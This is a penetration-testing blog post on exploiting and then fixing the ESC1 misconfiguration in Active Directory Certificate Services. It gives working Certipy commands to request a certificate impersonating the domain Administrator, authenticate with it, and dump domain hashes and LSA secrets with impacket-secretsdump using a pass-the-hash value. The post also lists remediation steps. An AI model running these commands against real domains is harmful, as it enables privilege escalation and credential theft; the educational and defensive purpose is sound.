---
title: "Exploiting Misconfigured Active Directory Certificate Template – ESC1"
slug: "adcs-esc1-exploit"
author: "PentStark Labs"
date: "2025-10-03"
readTime: "8 min read"
category: "Active Directory"
tags: ["ADCS", "Active Directory", "ESC1", "PKI", "Certipy", "Rubeus"]
image: "/blog01/blog01-0.png" 
excerpt: "How a single 'Enrollee supplies subject' option on an AD CS template lets attackers mint logon-capable certificates for any user, including Domain Admins."
featured: true
---

# Exploiting and Fixing Vulnerable Certificate Templates in Active Directory

Certificates are crucial in establishing trust and securing communication within the Active Directory environment. They are used for authentication, encryption, and digital signatures. Certificate Templates are predefined configurations that define the properties and settings for the certificates issued by the Active Directory Certificate Authority (CA). These templates help standardize certificate issuance and ensure certificates adhere to specific security requirements. An attacker can use these templates to escalate privileges from domain users to domain admins if they are not configured correctly. In this blog, we will discuss what a vulnerable template is and how to exploit and fix it.

## Active Directory Certificate Services (AD CS) Templates

Active Directory Certificate Services (AD CS) templates are predefined certificate request configurations that allow administrators to define the characteristics of certificates that will be issued by the CA (Certificate Authority). Templates serve as blueprints for different types of certificates and their properties, making it easier to manage and issue certificates with consistent settings across an organization’s PKI  Key Infrastructure).

Administrators can streamline requesting, issuing, and managing certificates within an organization using templates. Templates ensure consistency, simplify the certificate issuance process, and help maintain security standards by enforcing specific configurations for different certifications.

## Active Directory Certificate Services (AD CS) Vulnerable Templates

Templates, by default, are not vulnerable but made vulnerable by human-made misconfigurations. When writing this blog, these misconfigurations are divided into 11 parts (ESC1-ESC11). In this blog, we will exploit ESC1 misconfiguration in a template.

By exploiting this type of vulnerable Template, a domain user can escalate his privileges to that of a domain administrator in a Windows Active Directory Environment.

## Exploiting ESC1

For exploiting ESC1, we need the Template to meet certain criteria. The Template must have:

- Enrollment Rights set for the group our user belongs to so that we can request a new certificate from the Certificate Authority (CA).
- Extended Key Usage: Client Authentication means the generated certificate based on this Template can authenticate to the domain computers.
- Enrollee Supplies Subject set to True, which means we can supply SAN (Subject Alternate Name).
- No Manager Approval is required, which means the request is auto-approved.

### Step to Exploit Misconfigured Certificate Template – ESC1

1. Certipy is a tool used for finding and exploiting certificates in Active Directory.

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-1.png)

2. Run certipy against the domain controller to find any vulnerable templates.

```
certipy find -vulnerable -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!'
```
![ESC1 – AD CS Vulnerable Template](/blog01/blog01-2.png)


    - `-u`: Domain User  
    - `-p`: Domain User Password  
    - `-dc-ip`: Domain Controller IP  

    Domain: ACU.local


3. Cat the created text file by certipy to see the vulnerable Template.

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-3.png)

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-4.png)


    From the output, it is clear that enrollment rights are set for Domain Users, Enrollee Supplies Subject is set to True, and Extended Key Usage has Client Authentication.

4. Request a certificate and supply the Administrator’s SAN (Subject Alternate Name).

    ```
    certipy req -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!' -ca ACU-ANIKATE-DC-CA -target ANIKATE-DC.ACU.local -template ESC1 -upn Administrator@ACU.local -dns Anikate-DC.ACU.local
    ```
![ESC1 – AD CS Vulnerable Template](/blog01/blog01-5.png)

    - `ca`: Certificate Authority (ACU-ANIKATE-DC-CA in this case)  
    - `target`: CA Hostname (ANIKATE-DC.ACU.local in this case)  
    - `template`: Name of the vulnerable Template (ESC1 in this case)  
    - `upn`: Target Username (Administrator in this case)  
    - `dns`: DNS Server (Anikate-DC.ACU.local in this case)

5. Authenticate against the domain controller using the certificate.

```
certipy auth -pfx administrator_anikate-dc.pfx -dc-ip 192.168.0.144
```
![ESC1 – AD CS Vulnerable Template](/blog01/blog01-6.png)

    - `auth`: Which identity to authenticate as (We are establishing as Administrator, so use 0, i.e., UPN: Administrator@ACU.local)  
    - `-pfx`: Saved Certificate (administrator_anikate-dc.pfx in this case)  

    Now, we attempt to show the domain controller using the certificate and get the TGT (Ticket Granting Ticket); the domain controller will attach the NTLM hash of the user with TGT.

6. Dump hashes and LSA secrets using secretsdump.

```
impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:9a0c89751f9ac637242da5ac889fa3aa' 'ACU.local/Administrator@192.168.0.144.'
```
![ESC1 – AD CS Vulnerable Template](/blog01/blog01-7.png)


## Fixing the Misconfigured Certificate Template – ESC1

1. Open the Server Manager on your Certificate Authority.  
2. Click on **Tools** and then **Certification Authority**.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-8.png)

3. Right-click on **Certificate Templates** and click on **Manage**.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-9.png)

4. Right-click on the vulnerable Template and click on **Properties**.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-10.png)

5. Go to **Issuance Requirements** and check the **CA certificate manager approval** box.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-11.png)

6. Go to **Subject Name**, select **Build from this Active Directory information** instead of **Supply in the request**, and click **Apply**.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-12.png)

7. Go to **Security**, select the **Domain Users Group**, uncheck the **Enroll** box, and then click **Apply** and **OK**.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-13.png)

8. Now rerun certipy.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-14.png)

9. Cat the created text file by certipy to see if the vulnerable Template exists.  

![ESC1 – AD CS Vulnerable Template](/blog01/blog01-15.png)

Certipy should not find any vulnerable templates.

## TL;DR

Attackers can escalate their privileges from domain users to domain admins by exploiting the misconfiguration of certificate templates that are not vulnerable by default but due to human-made misconfigurations. For exploitation, we need the Template to meet certain requirements: ability to supply SAN (Subject Alternate Name), manager approval set to False, enrollment rights for the user group, and Template allows client authentication.
